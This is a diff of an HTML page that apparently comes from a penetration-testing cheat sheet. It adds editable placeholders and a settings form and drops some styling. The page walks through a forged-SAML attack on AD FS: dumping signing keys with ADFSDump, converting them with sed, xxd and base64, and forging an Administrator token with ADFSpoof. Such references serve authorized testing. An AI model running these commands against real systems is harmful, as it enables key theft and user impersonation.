@@ -152,150 +152,21 @@
   <div class="tips">
   <p><strong>Usage Tips:</strong></p>
   <ul>
+    <li>Click on a keyword to enable inline editing.</li>
     <li>Click inside a code block to copy (excludes comments).</li>
     <li>Use the <strong><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -6 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></strong> button to view examples.</li>
     <li>Click outside to collapse all examples.</li>
   </ul>
 </div>
   <div id="dynamicFormContainer">
-	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="B64_ENCRYPTED_TOKEN">B64 ENCRYPTED TOKEN: </label><input type="text" name="B64_ENCRYPTED_TOKEN"></div><div class="input-group"><label for="DC_IP">DC IP: </label><input type="text" name="DC_IP"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="IDENTIFIER">IDENTIFIER: </label><input type="text" name="IDENTIFIER"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="PRIVATE_KEY">PRIVATE KEY: </label><input type="text" name="PRIVATE_KEY"></div><div class="input-group"><label for="SERVER">SERVER: </label><input type="text" name="SERVER"></div><div class="input-group"><label for="SIGN_IN_ENDPOINT">SIGN IN ENDPOINT: </label><input type="text" name="SIGN_IN_ENDPOINT"></div><div class="input-group"><label for="SPOOF_USER">SPOOF USER: </label><input type="text" name="SPOOF_USER"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div></form>
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="B64_ENCRYPTED_TOKEN">B64 ENCRYPTED TOKEN: </label><input type="text" name="B64_ENCRYPTED_TOKEN"></div><div class="input-group"><label for="DC_IP">DC IP: </label><input type="text" name="DC_IP"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="IDENTIFIER">IDENTIFIER: </label><input type="text" name="IDENTIFIER"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="PRIVATE_KEY">PRIVATE KEY: </label><input type="text" name="PRIVATE_KEY"></div><div class="input-group"><label for="SERVER">SERVER: </label><input type="text" name="SERVER"></div><div class="input-group"><label for="SIGN_IN_ENDPOINT">SIGN IN ENDPOINT: </label><input type="text" name="SIGN_IN_ENDPOINT"></div><div class="input-group"><label for="SPOOF_USER">SPOOF USER: </label><input type="text" name="SPOOF_USER"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
 	<div class="buttons center">
-		<button id="form_btn">Show Params Form</button>
+		<button id="form_btn">Show Inspector</button>
 		<button id="replace_btn" style="display: none;">Replace Params</button>
 		<button id="reset_btn" style="display: none;">Reset</button>
 		<button id="clear_btn" style="display: none;">Clear Cache</button>
 	</div>
 </div>
-<style>
-#dynamicFormContainer {
-	width: 100%;
-	margin: 0 auto;
-	background-color: white;
-	padding: 0;
-	box-shadow: 1px 4px 10px 1px #aaa;
-	font-family: system-ui;
-}
-
-#dynamicFormContainer * {
-    box-sizing: border-box;
-}
-
-#dynamicFormContainer input {
-  border-radius: 0.2em;
-  margin-bottom: 15px;
-}
-
-#dynamicFormContainer input:focus {
-  outline: 0.1em solid var(--secondary);
-}
-
-#dynamicFormContainer input[type=text] {
-  width: 100%;
-  border-radius: 0.2em;
-  border: 0.1em solid var(--secondary);
-  padding: 0.4rem;
-  font-size: 0.9rem;
-}
-
-#dynamicFormContainer label {
-	color: #333333;
-	font-size: 0.9rem;
-}
-
-#dynamicFormContainer button {
-	display: inline-block;
-	margin: 20px auto;
-	width: 150px;
-	height: 40px;
-	border-radius: 25px;
-	border: none;
-	color: #f5f5f5;
-	font-weight: 700;
-	background: rgba(44, 82, 179);
-	grid-column: 1 / span 2;
-    justify-self: center;
-}
-
-#dynamicFormContainer button:hover {
-    cursor: pointer;
-    background: rgba(44, 82, 179, 0.95);
-}
-
-#dynamicForm {
-    grid-template-columns: 1fr 1fr;
-    column-gap: 20px;
-    row-gap: 0px;
-    margin: 0 auto;
-    padding: 30px 20px 0;
-}
-
-.input-group {
-    display: flex;
-    flex-direction: column;
-}
-
-.center {
-	display: flex;
-	justify-content: center;
-	align-items: center;
-}
-
- 
-body.dark-mode #dynamicFormContainer {
-	width: 100%;
-	margin: 0 auto;
-	background-color: #23272a;
-	padding: 0;
-	box-shadow: 1px 4px 10px 1px #23272a;
-	font-family: system-ui;
-}
-
-body.dark-mode #dynamicFormContainer * {
-    box-sizing: border-box;
-}
-
-body.dark-mode #dynamicFormContainer input {
-	border-radius: 0.2em;
-	border: 0.1em solid #eeeeee;
-}
-
-body.dark-mode #dynamicFormContainer input:focus {
-	outline: 0.1em solid #616161;
-}
-
-body.dark-mode #dynamicFormContainer input[type=text] {
-  width: 100%;
-  border-radius: 0.2em;
-  border: 0.1em solid #616161;
-  padding: 0.4rem;
-  font-size: 0.9rem;
-  background-color: #bdbdbd;
-}
-
-body.dark-mode #dynamicFormContainer label {
-	color: #fafafa;
-	font-size: 0.9rem;
-}
-
-body.dark-mode #dynamicFormContainer button {
-	display: inline-block;
-	margin: 20px auto;
-	width: 150px;
-	height: 40px;
-	border-radius: 25px;
-	border: none;
-	color: #fafafa;
-	font-weight: 700;
-	background: #616161;
-	grid-column: 1 / span 2;
-    justify-self: center;
-}
-
-body.dark-mode #dynamicFormContainer button:hover {
-    cursor: pointer;
-    background: #424242;
-}
-</style>
   <h3 id="abuse-1-generate-a-saml-20-token-for-some-app">Abuse #1: Generate a SAML 2.0 token for some app</h3>
 <p class="tabs">
 <button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
@@ -366,16 +237,16 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">c:[Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname", Issuer == "AD AUTHORITY"]
 </span></span></span><span class="line"><span class="cl"><span class="go"> =&gt; issue(store = "Active Directory", types = ("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn", "http://schemas.xmlsoap.org/claims/CommonName"), query = ";userPrincipalName,sAMAccountName;{0}", param = c.Value);
 </span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Alternative <span class="k">if</span> error
-</span></span><span class="line"><span class="cl"><span class="go">.\ADFSDump.exe /user:<span class="o">&lt;USER&gt;</span> /password:<span class="o">&lt;PASSWORD&gt;</span> /domain:<span class="o">&lt;DOMAIN&gt;</span> /server:<span class="o">&lt;DC_IP&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="go">.\ADFSDump.exe /user:<span class="o editable-keyword">&lt;USER&gt;</span> /password:<span class="o editable-keyword">&lt;PASSWORD&gt;</span> /domain:<span class="o editable-keyword">&lt;DOMAIN&gt;</span> /server:<span class="o editable-keyword">&lt;DC_IP&gt;</span>
 </span></span></span></code><div class="output-bubble">Sample Output:
 TO-DO</div></pre></div><p><small><em>Ref: <a href="https://github.com/mandiant/ADFSDump">ADFSDump</a></em></small></p>
 <h4 id="2-convert-to-binary-blob">2. Convert to binary blob</h4>
 <div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy private key<span class="o">(</span>s<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="go">echo '<span class="o">&lt;PRIVATE_KEY&gt;</span>' | sed 's/-//g' | xxd -r -p &gt; DkmKey.bin
+</span></span><span class="line"><span class="cl"><span class="go">echo '<span class="o editable-keyword">&lt;PRIVATE_KEY&gt;</span>' | sed 's/-//g' | xxd -r -p &gt; DkmKey.bin
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">echo</span> <span class="s1">'8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1'</span> <span class="p">|</span> sed <span class="s1">'s/-//g'</span> <span class="p">|</span> xxd -r -p &gt; DkmKey.bin
 </span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy Encrypted Token Signing Key Begin ... Encrypted Token Signing Key End
-</span></span><span class="line"><span class="cl"><span class="go">echo -n '<span class="o">&lt;B64_ENCRYPTED_TOKEN&gt;</span>' | base64 -d &gt; EncryptedPfx.bin
+</span></span><span class="line"><span class="cl"><span class="go">echo -n '<span class="o editable-keyword">&lt;B64_ENCRYPTED_TOKEN&gt;</span>' | base64 -d &gt; EncryptedPfx.bin
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">echo</span> -n <span class="s1">'AAAAAQAAAA ...[SNIP]... EsNEUSTXxm'</span> <span class="p">|</span> base64 -d &gt; EncryptedPfx.bin
 </span></span></div></pre></div><h4 id="3-check-which-private-key-is-correct">3. Check which private key is correct</h4>
@@ -395,7 +266,7 @@ TO-DO</div></pre></div><p><small><em>Ref: <a href="https://github.com/mandiant/A
 </span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/mandiant/ADFSpoof">ADFSpoof</a></em></small></p>
 <h4 id="4-generate-saml-20-token">4. Generate SAML 2.0 token</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy info from ADFS dump
-</span></span><span class="line"><span class="cl"><span class="go">python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s <span class="o">&lt;SERVER&gt;</span> saml2 --endpoint <span class="o">&lt;SIGN_IN_ENDPOINT&gt;</span> --nameidformat urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress --nameid <span class="o">&lt;SPOOF_USER&gt;</span>@<span class="o">&lt;DOMAIN&gt;</span> --rpidentifier <span class="o">&lt;IDENTIFIER&gt;</span> --assertions '&lt;Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"&gt;&lt;AttributeValue&gt;<span class="o">&lt;SPOOF_USER&gt;</span>@<span class="o">&lt;DOMAIN&gt;</span>&lt;/AttributeValue&gt;&lt;/Attribute&gt;&lt;Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"&gt;&lt;AttributeValue&gt;<span class="o">&lt;SPOOF_USER&gt;</span>&lt;/AttributeValue&gt;&lt;/Attribute&gt;' 
+</span></span><span class="line"><span class="cl"><span class="go">python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s <span class="o editable-keyword">&lt;SERVER&gt;</span> saml2 --endpoint <span class="o editable-keyword">&lt;SIGN_IN_ENDPOINT&gt;</span> --nameidformat urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress --nameid <span class="o editable-keyword">&lt;SPOOF_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> --rpidentifier <span class="o editable-keyword">&lt;IDENTIFIER&gt;</span> --assertions '&lt;Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"&gt;&lt;AttributeValue&gt;<span class="o editable-keyword">&lt;SPOOF_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>&lt;/AttributeValue&gt;&lt;/Attribute&gt;&lt;Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"&gt;&lt;AttributeValue&gt;<span class="o editable-keyword">&lt;SPOOF_USER&gt;</span>&lt;/AttributeValue&gt;&lt;/Attribute&gt;' 
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> python3 ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s core.example.com saml2 --endpoint https://core.example.com:8443/adfs/saml/postResponse --nameidformat urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress --nameid Administrator@example.com --rpidentifier https://core.example.com:8443 --assertions <span class="s1">'&lt;Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"&gt;&lt;AttributeValue&gt;Administrator@example.com&lt;/AttributeValue&gt;&lt;/Attribute&gt;&lt;Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"&gt;&lt;AttributeValue&gt;Administrator&lt;/AttributeValue&gt;&lt;/Attribute&gt;'</span>
 </span></span><span class="line"><span class="cl"><span class="go">    ___    ____  ___________                   ____
